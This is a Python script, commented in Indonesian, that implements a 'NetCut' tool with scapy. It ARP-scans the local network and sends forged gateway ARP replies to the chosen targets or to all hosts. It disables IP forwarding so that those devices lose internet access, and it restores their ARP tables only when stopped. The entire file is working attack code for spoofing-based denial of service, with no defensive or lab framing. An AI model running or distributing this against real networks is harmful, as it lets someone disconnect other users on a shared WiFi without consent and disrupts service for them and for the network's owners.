import os
import sys
import time
import socket
import subprocess
from scapy.all import ARP, Ether, srp, sendp, send

class NetCut:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors
        self.is_running = False

    def get_gateway_ip(self):
        try:
            cmd = "ip route | grep default | awk '{print $3}'"
            gateway = subprocess.check_output(cmd, shell=True).decode().strip()
            return gateway if gateway else None
        except:
            return None

    def get_ssid(self):
        try:
            ssid = subprocess.check_output("iwgetid -r", shell=True).decode().strip()
            return ssid if ssid else "Unknown WiFi"
        except:
            return "Local Network"

    def scan_network(self, gateway_ip):
        c = self.colors
        print(f"  {c.INFO} Mencari target di {gateway_ip}/24...")
        # ARP Scan
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{gateway_ip}/24")
        ans, _ = srp(request, timeout=2, verbose=False)

        clients = []
        for sent, received in ans:
            if received.psrc != gateway_ip:
                try:
                    name = socket.gethostbyaddr(received.psrc)[0]
                except:
                    name = "Unknown Device"
                
                clients.append({
                    'ip': received.psrc, 
                    'mac': received.hwsrc, 
                    'name': name
                })
        return clients 

    def spoof(self, target_ip, target_mac, gateway_ip):
        """ Kirim ARP Reply palsu ke target (Kita adalah Router) """
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet, verbose=False)

    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """ Kembalikan ARP Table ke kondisi normal (Restoration) """
        c = self.colors
        print(f"\r  {c.Y}[*] Memulihkan koneksi {target_ip}...{c.NC}", end="")
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(packet, count=4, verbose=False)

    def start_attack(self):
        c = self.colors
        gw_ip = self.get_gateway_ip()
        ssid = self.get_ssid()

        if not gw_ip:
            print(f"  {c.R}[!] Gagal deteksi Gateway!{c.NC}")
            return

        # Ambil MAC Gateway dulu buat restorasi nanti
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip), timeout=2, verbose=False)
            gw_mac = ans[0][1].hwsrc
        except:
            print(f"  {c.R}[!] Gagal ambil MAC Gateway!{c.NC}")
            return

        clients = self.scan_network(gw_ip)
        if not clients:
            print(f"  {c.R}[!] Tidak ada target ditemukan.{c.NC}")
            return

        print(f"\n  {c.B}[ NETCUT ENGINE - {ssid.upper()} ]{c.NC}")
        print(f"  {c.W}No   IP Address      Device Name{c.NC}")
        for i, client in enumerate(clients):
            print(f"  [{i + 1:02}]  {client['ip']:15} {c.G}{client['name'][:20]}{c.NC}")

        try:
            val = input(f"\n  {c.Q} Pilih No (atau 'all'): ").strip()
            if val.lower() == 'all':
                targets = clients
            else:
                targets = [clients[int(val) - 1]]

            # PENTING: Matikan IP Forwarding biar internet target putus!
            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
            
            self.is_running = True
            print(f"  {c.Y}[*] NetCut Aktif. Memutus {len(targets)} target...{c.NC}")
            print(f"  {c.INFO} Tekan Ctrl+C untuk berhenti.\n")

            count = 0
            while self.is_running:
                for t in targets:
                    self.spoof(t['ip'], t['mac'], gw_ip)
                
                count += 1
                print(f"\r  {c.G}[+]{c.NC} Packets Sent: {c.Y}{count}{c.NC} | Target: {c.C}{len(targets)}{c.NC}", end="", flush=True)
                time.sleep(2)

        except KeyboardInterrupt:
            print(f"\n\n  {c.WARN} Membersihkan jejak ARP...")
            for t in targets:
                self.restore(t['ip'], t['mac'], gw_ip, gw_mac)
            
            # Kembalikan settingan IP Forwarding (opsional, tergantung config lu)
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
            print(f"\n  {c.G}[+] Selesai. Koneksi normal kembali.{c.NC}")